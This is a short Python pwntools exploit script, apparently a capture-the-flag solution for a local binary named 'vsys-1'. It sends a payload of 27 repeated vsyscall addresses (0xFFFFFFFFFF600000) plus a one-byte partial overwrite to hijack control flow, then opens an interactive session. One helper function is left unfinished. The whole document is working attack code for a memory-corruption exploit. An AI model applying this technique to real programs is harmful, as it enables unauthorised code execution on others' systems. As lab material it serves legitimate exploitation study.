#!/usr/bin/python3
# -*- coding:utf-8 -*-

from pwn import *
import os
import time
import struct

# context.log_level = "debug"
binelf = './vsys-1'
sh = process(binelf)
elf = ELF(binelf)
debug = 1

def exp(debug):
    global r
    if debug == 1:
        r = process(binelf)
    r.recvuntil('Your input :\n')
    ret_addr = 0xFFFFFFFFFF600000

    #r.send(q





# 生成调试文件
try:
	f = open('pid', 'w')
	f.write(str(proc.pidof(sh)[0]))
	f.close()
except Exception as e:
	print(e)


# pause()
#newaddr = p64(ret_addr) * 27 + bytes.fromhex('4e')
#print(newaddr)
print(p64(ret_addr) * 27 + b'\x4e')
sh.send(p64(ret_addr) * 27 + b'\x4e')

sh.interactive()

# 删除调试文件
os.system("rm -f pid")
